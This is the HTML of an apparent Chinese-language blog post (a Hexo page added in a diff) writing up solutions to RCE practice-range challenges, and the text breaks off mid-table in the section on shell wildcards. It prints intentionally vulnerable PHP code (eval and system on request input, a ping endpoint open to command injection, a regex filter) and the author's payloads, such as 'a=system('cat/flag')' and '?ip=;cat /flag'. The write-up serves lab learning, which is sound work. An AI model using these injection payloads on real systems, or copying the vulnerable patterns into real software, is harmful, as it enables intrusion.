@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="RCE靶场第一题 12345678910111213$code &#x3D; &quot;include(&#x27;flag.php&#x27;);echo &#x27;This will get the flag by eval PHP code: &#x27;.\$flag;&quot;;$bash &#x3D; &quot;echo &#x27;This will get the flag by Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE靶场学习">
+<meta property="og:url" content="http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="RCE靶场第一题 12345678910111213$code &#x3D; &quot;include(&#x27;flag.php&#x27;);echo &#x27;This will get the flag by eval PHP code: &#x27;.\$flag;&quot;;$bash &#x3D; &quot;echo &#x27;This will get the flag by Linux">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-07-10T11:32:42.000Z">
+<meta property="article:modified_time" content="2025-07-10T11:34:49.500Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>RCE靶场学习</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/07/10/H&NCTF-2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&text=RCE靶场学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&is_video=false&description=RCE靶场学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RCE靶场学习&body=Check out this article: http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&title=RCE靶场学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&name=RCE靶场学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/07/10/rce%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/&t=RCE靶场学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">RCE靶场第一题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">RCE靶场第二题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%89%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">RCE靶场第三题</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#get_fun%E5%87%BD%E6%95%B0%E4%B8%AD"><span class="toc-number">3.0.0.0.1.</span> <span class="toc-text">get_fun()函数中</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#start%E5%87%BD%E6%95%B0%E4%B8%AD"><span class="toc-number">3.0.0.0.2.</span> <span class="toc-text">start()函数中</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#func_list%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">3.0.0.0.3.</span> <span class="toc-text">$func_list[]中的函数分析</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">RCE靶场第四题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%94%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">RCE靶场第五题</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%80%83%E5%AF%9F%E7%9A%84%E6%98%AFshell%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">5.0.0.0.1.</span> <span class="toc-text">考察的是shell的基本运算符</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AD%E9%A2%98"><span class="toc-number"></span> <span class="toc-text">RCE靶场第六题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95"><span class="toc-number"></span> <span class="toc-text">通配符及其用法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3"><span class="toc-number">1.</span> <span class="toc-text">解决</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%B8%83%E9%A2%98"><span class="toc-number"></span> <span class="toc-text">RCE靶场第七题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AB%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">RCE靶场第八题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">第九题</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        RCE靶场学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-07-10T11:32:42.000Z" class="dt-published" itemprop="datePublished">2025-07-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="rce靶场第一题">RCE靶场第一题</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="string">&quot;include(&#x27;flag.php&#x27;);echo &#x27;This will get the flag by eval PHP code: &#x27;.\$flag;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$bash</span> = <span class="string">&quot;echo &#x27;This will get the flag by Linux bash command - cat /flag: &#x27;;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$bash</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>RCE靶场第一题</p>
+<p>在这里将code字符包含了flag.php文件
+并且bash命令字符串会打印这串提示信息并且尝试实行命令查看/flag文件的内容
+eval()会将包含的内容当作PHP代码来执行
+system(）会执行包含的系统命令，即bash命令，然后将会读取flag</p>
+<h2 id="rce靶场第二题">RCE靶场第二题</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里是个标准的一句话木马的题目
+eval会执行传入的post参数a所包含的命令，所以我们可以通过传入a的特定值来执行恶意代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>然后就可以读取到flag</p>
+<h2 id="rce靶场第三题">RCE靶场第三题</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_ctf</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$function</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$content</span> . <span class="string">&quot;);&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your Code: <span class="subst">$code</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$func_list</span> = [<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;usort&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;array_reduce&#x27;</span>,<span class="string">&#x27;preg_replace&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>] = <span class="variable">$func_list</span>[<span class="title function_ invoke__">array_rand</span>(<span class="variable">$func_list</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$random_func</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>];</span><br><span class="line">    <span class="variable">$url_fucn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/_/&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>]);   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;获得新的函数: <span class="subst">$random_func</span> ，去 https://www.php.net/manual/zh/function.&quot;</span>.<span class="variable">$url_fucn</span>.<span class="string">&quot;.php 查看函数详情。&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"><span class="variable">$act</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_func</span> = <span class="title function_ invoke__">get_fun</span>();    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$act</span> == <span class="string">&quot;r&quot;</span>)&#123; <span class="comment">/* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */</span></span><br><span class="line">        <span class="title function_ invoke__">session_unset</span>();</span><br><span class="line">        <span class="title function_ invoke__">session_destroy</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$act</span> == <span class="string">&quot;submit&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$user_content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]; </span><br><span class="line">        <span class="title function_ invoke__">hello_ctf</span>(<span class="variable">$random_func</span>, <span class="variable">$user_content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="title function_ invoke__">start</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h6 id="get_fun函数中">get_fun()函数中</h6>
+<p>每次随机从
+$func_list[]这个列表中读取一个参数并将其存入session中，然后返回这个函数名</p>
+<h6 id="start函数中">start()函数中</h6>
+<p>首先执行get_fun()函数获得$func_list[]列表内的一个参数
+然后判断get参数action是否为r，如果是，执行session_unset()函数，清空session变量然后重新用get_fun()函数获取一个参数。
+然后判断get参数action是否为submit，如果是，则接受提交的post参数content并执行。</p>
+<p>hello_ctf()函数会调用所有的函数，将选定的函数和输入的内容当成PHP代码并且使用eval()执行</p>
+<h6 id="func_list中的函数分析">$func_list[]中的函数分析</h6>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func_list</span> = [<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;usort&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;array_reduce&#x27;</span>,<span class="string">&#x27;preg_replace&#x27;</span>];</span><br><span class="line"><span class="comment">/*eval()执行一个字符串为PHP代码；</span></span><br><span class="line"><span class="comment">assert()判断是否为字符串，如果是字符串，将当作PHP代码并且用eval()执行</span></span><br><span class="line"><span class="comment">call_user_func()用于调用回调参数，第一个参数作为调用的函数，第二个为函数的变量数据</span></span><br><span class="line"><span class="comment">create_function()从传递的参数中创建动态参数，并返回它的唯一值</span></span><br><span class="line"><span class="comment">array_map()第一个参数调用一个函数然后调用一个数组，返回唯一值</span></span><br><span class="line"><span class="comment">call_user_func_array()将第一个参数调用为函数，将参数数组作为变量传入函数</span></span><br><span class="line"><span class="comment">usort()判断两个值是否相等，相等返回原数值</span></span><br><span class="line"><span class="comment">array_reduce()将将数组中的每个值放入函数中进行迭代，最后计算为单一值</span></span><br><span class="line"><span class="comment">preg_replace()将传入的的字符串或者数组进行完全替换</span></span><br></pre></td></tr></table></figure>
+<p>用?action=r获得一个函数，然后构造相应的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;$&#123;flag&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo $flag;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>));</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;print_r&#x27;</span>, <span class="variable">$flag</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>, <span class="string">&#x27;echo $flag;&#x27;</span>)(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>), <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>), <span class="keyword">array</span>());</span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$a</span>,<span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>));</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$a</span>,<span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>));</span><br><span class="line"><span class="title function_ invoke__">array_reduce</span>(<span class="variable">$a</span>,<span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>));</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, $&#123;<span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>)&#125;);</span><br></pre></td></tr></table></figure>
+<p>然后我们就可以得到类似于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Code: <span class="title function_ invoke__">array_reduce</span>(<span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">print_r</span>(<span class="variable">$flag</span>)));</span><br></pre></td></tr></table></figure>
+<p>此时我们只需要构造相应的post参数content就可以读取flag。</p>
+<h2 id="rce靶场第四题">RCE靶场第四题</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>没什么好说的，这里用的是system命令 <code>system()</code>
+函数会通过sh软连接执行你输入的系统命令。
+所以我们构造payload传入a让它读取flag即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=cat /flag<span class="comment">//不知道为啥这里不加空格无法执行</span></span><br></pre></td></tr></table></figure>
+<h2 id="rce靶场第五题">RCE靶场第五题</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_server</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 1 <span class="subst">$ip</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) ? <span class="title function_ invoke__">hello_server</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里的漏洞函数为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_server</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 1 <span class="subst">$ip</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里它会执行用户输入的ip地址检测是否能ping通
+但是没有严格的过滤，所以我们可以传入任意指令</p>
+<h6 id="考察的是shell的基本运算符">考察的是shell的基本运算符</h6>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;: and操作 只有当第一个命令 cmd_1 执行成功（返回值为 0）时，才会执行第二个命令 cmd_2</span><br><span class="line">||  or操作 只有当第一个命令 cmd_1 执行失败（返回值不为 0）时，才会执行第二个命令 cmd_2</span><br><span class="line">&amp;   将命令 cmd_1 放到后台执行，Shell 立即执行 cmd_2，两个命令并行执行。</span><br><span class="line">;   无论前一个命令 cmd_1 是否成功，都会执行下一个命令 cmd_2。</span><br></pre></td></tr></table></figure>
+<p>所以我们只需要通过shell的基本运算符来拼接我们需要传入的命令即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">1.1</span>.<span class="number">1.1</span>&amp;&amp;cat /flag<span class="comment">//成功载入公共免费的DNS服务器然后执行cat获得flag的命令</span></span><br><span class="line">?ip=||cat /flag<span class="comment">//令ip无法ping通然后获得flag</span></span><br><span class="line">?ip=;cat /flag<span class="comment">//无所谓第一条命令是啥都会执行第二条命令</span></span><br><span class="line">?ip=&amp;cat /flag  <span class="comment"># &amp;需要URL编码 将命令1和命令2同时执行</span></span><br></pre></td></tr></table></figure>
+<h1 id="rce靶场第六题">RCE靶场第六题</h1>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这关考察的是通配符的使用</p>
+<h1 id="通配符及其用法">通配符及其用法</h1>
+<table>
+<colgroup>
+<col style="width: 5%" />
+<col style="width: 36%" />
